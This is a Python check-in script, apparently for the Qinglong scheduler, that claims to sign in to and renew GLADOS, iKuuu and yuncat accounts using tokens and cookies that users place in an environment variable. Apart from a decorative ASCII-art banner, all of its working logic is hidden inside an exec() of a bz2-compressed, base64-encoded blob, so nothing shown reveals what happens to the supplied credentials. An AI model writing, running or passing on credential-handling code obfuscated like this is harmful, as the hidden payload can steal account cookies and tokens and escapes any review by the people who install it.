# --encoding:utf-8 -- #
"""
    
    联系方式:110

    飞机

    ver 1.0

    2024.6.30

    实现 GLADOS、iKuuu yuncat 每日签到和续费

    环境变量:yuanshen_fj

    参数：GLADOS 的 token和cookie
        iKuuu 的 

    格式 export yuanshen_fj=备注#Glatoken#Glacookie#iKuuu_cookie#Yuncat_cookie

    定时 每天9点一次
    cron: 0 0 9 * * ? 

"""

#   --------------------------------一般不动区--------------------------------
#
#                                               #v;;@
#                                           .8@;;;3;;;;&@@u
#                                     ##%$$$$;;;*n8;;$;;;~&$$$$$@&          3@
#                                +@$%$$$$$$$%!;;;%;a$%*;;#$$$$%$$$$%$@!    *n *@n
#                              &$$$$$$$$$$$$$@*;;;$;;;;;@$$%$$$$$$$$$$%$$@%
#                             $$$$$$$$$$$$$$$$;;;;8;;;;$$$$$$$$i#$$%3i!@i@$$@
#                             #$$$$$$$$$$$$$$%$&&&#@@@@$$$$$$$#!!i#%#i!i3#$$$%&.&$
#                             @$$$$$$$$$$$$&@@@@@@@@&$$$$$$$$$%$!6@@iii6!!@@$@$$&.
#                          +&$%$@@@6iiiiizzzzuzzzzzazzzazzui!@@&%$$$$&i%$#@!i@%$$@
#                        #@@&&iiizzuazzaazzz@zzaazaaazazzzzaazzzzii#@$$$$$ii!i!$$%+
#                      @&&&@@uzzzzaazzzzzzi8zzzzazzazazaaizzzzazazzzaiii@$#!#i###
#                      @&&i#zzzazazzizi#@@6^izzzzzaazazu$izazzazzzzzaaz1iii8#$#@%%
#                      +i@zzzaazz11zzi!@+-%3zaaza1zzzi!#iaazz68zzzzzzzzz1iii&&#i$@
#                       i#1zazzza@azi38++. ;iuzzziazz8++*6azzzzzzzzzzzazazzii6&$&$.
#        .3       @    #i@zzzzaa3i@@3     .@&izzziu1#-- -@&###azuuzzaazzzzazzi&&# %^
#       z-i!*       a  ii@azzzzz@-6  @@@@   &@izz%#8- +8   $@3  &!azzzzzaaazzz@   -$#
#      o   !!1  -o  @+!8 @izaazz@ @  *&1    % %iaa#8  #   @@@@~  @izazzzaazzzzi    &$~
#     6    iii      3    .i1auaa! %        +o  -@i%.  @          @;$zazzzzzzaza    @%$.
#     n            !      #!iziiz@  %#;..8$        .  .@        @.a#zzaazzizzz%     $$@
#   * ^            #      va@ii3!ia$  ..                 ;&@@@1   %zzaaaaiizaz@
# ~;% ;           ~ #     @aaaz@#  ......     3           ....   $zzzza1i86azz#    za.@ 6
#     #          a .@@@   &aaaa@               -&@!       .... -6uiiizi#ai@izau    3z @;
#      ~         #        +uuuu!@                             ^++oiii%3-&1i&azz@   61~  &
#      -~        @         @uuu!-i63..                         $#@i+--%3iia!#izzu      * .
#        n       o          &311#iiiii@!                    .---o@#iii%aaaz-   i@&&^
#         @~      @          !31u@ii#i$&@@8!3#;-------++-1##3@ 8@.!iii1aaa&
#           #~;    !      #$#@%336$%#8@%%$$#&63i3n  @!!6668#&$$$$#!ii#aauu#
#        ..   +8~~~;;@@@&.@3#&$&%%#$&8888%&$$%$$%@&$$$$$$$$$$$@88888#uuuu$$-
#             .   .-%   6~@%$$8#$#$$88888888&#$#&a6%$%$#@8888888888@113u@$$$$
#                   1    -z$$$$6366%$%$&%88888&#&u;~;86686686%v%@611!3&$$$$#z  ;u
#                    1--+#^@$$$6$8#%aaai$668688;$&66668686688% a!338&$$$$$v.  .^@
#                      @@@@@$&#@ ^u%!uu%%88866$@#&8666686668%&   -a$&$$$@.  8@#
#                        $&##     @##816666666868#8666666366&$.   3u%$%@&8;*@ %@
#            @   @                 %#@366368$$@66866666666636&;&  @u%3$@#u$u-  o&
#       @ @. @ -v8i%               !6336666663&6666636!66336!66z~  @~#!11uuui1   #
#       @ @  @  @ @               #&&@663666$va$6666!33666666#&$%@  # @!1u33$6!!$  @
#       @ @ @.  @ @   @@@@- @&   @&$@1&6!636a$@1%6663!3333&$z1$$$$@@    +#838#!&v3   v
#       @@@ @ 8 -a@              @%$;&i$&666#n6%;3#3336@&&**#;#$$$#6za    .3$3131 -
#       n -@ @@ i@@.             #$@~%8$$$&@on@@@@$v&$%$$$$$$3n$$&iz%%a&     o33#
#              @   +            +&&@a&$$$%$$ou$$$$$&&~~$$$$1$@;$$&#%%z868$@@!;#3-
#                                v   .@&&$$$&$#%%%&@#&$&$$$$$&;#@@@&%$#%&@   %8u!
#                             !%&       #$&#ou6%!%#  .#&$$$$@       1 @$^
#                            a@ .i-i+ . ^&%%33!8%%%     #&&+       !1@#8@
#                            @$6-@  i#&    -8@@@@#@#^     @&^     %n*!@.
#                           &$$++i$
#                             .@$$%$
#
# ...................................................................
#           堂主保佑             永无BUG
#           堂主镇楼             BUG辟邪
#
#   堂主曰:
#
#        一日复一日，代码何其多！
#        只愿无bug，每日醉成仙！
#
# --------------------------------代码区--------------------------------

try:
  import bz2, base64
  exec(bz2.decompress(base64.b64decode('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')))
except Exception as e:
  print('脚本执行出错:',str(e))
